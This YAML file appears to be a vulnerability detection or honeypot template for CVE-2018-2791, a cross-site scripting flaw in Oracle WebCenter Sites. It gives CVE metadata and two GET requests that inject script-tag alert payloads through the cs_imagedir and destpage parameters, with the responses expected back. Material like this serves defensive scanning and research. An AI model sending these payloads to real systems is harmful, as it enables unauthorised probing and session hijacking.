id: CVE-2018-2791
info:
  name: Oracle Fusion Middleware WebCenter Sites - Cross-Site Scripting
  author: madrobot,leovalcante
  description: The Oracle WebCenter Sites component of Oracle Fusion Middleware is
    susceptible to multiple instances of cross-site scripting that could allow unauthenticated
    attackers with network access via HTTP to compromise Oracle WebCenter Sites. Impacted
    versions that are affected are 11.1.1.8.0, 12.2.1.2.0 and 12.2.1.3.0. Successful
    attacks require human interaction from a person other than the attacker and while
    the vulnerability is in Oracle WebCenter Sites, attacks may significantly impact
    additional products. Successful attacks of this vulnerability can result in unauthorized
    access to critical data or complete access to all Oracle WebCenter Sites accessible
    data as well as unauthorized update, insert or delete access to some of Oracle
    WebCenter Sites accessible data.
  severity: high
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the targeted user''s browser,
    potentially leading to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Apply the latest security patches provided by Oracle to address this
    vulnerability.

    '
  reference:
  - http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html
  - http://web.archive.org/web/20211206165005/https://securitytracker.com/id/1040695
  - https://www.exploit-db.com/exploits/44752/
  - https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites
  - https://nvd.nist.gov/vuln/detail/CVE-2018-2791
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
    cvss-score: 8.2
    cve-id: CVE-2018-2791
    epss-score: 0.02132
    epss-percentile: 0.88082
    cpe: cpe:2.3:a:oracle:webcenter_sites:11.1.1.8.0:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: oracle
    product: webcenter_sites
  tags: cve2018,cve,edb,oracle,xss,wcs
traps:
- request:
    method: GET
    path: /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
    headers:
      Host: '{{BaseURL}}'
    body: ''
  response:
    status_code: 200
    headers: {}
    body: <script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif<script>alert(24)</script>Missing
      translation key
- request:
    method: GET
    path: /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
    headers:
      Host: '{{BaseURL}}'
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
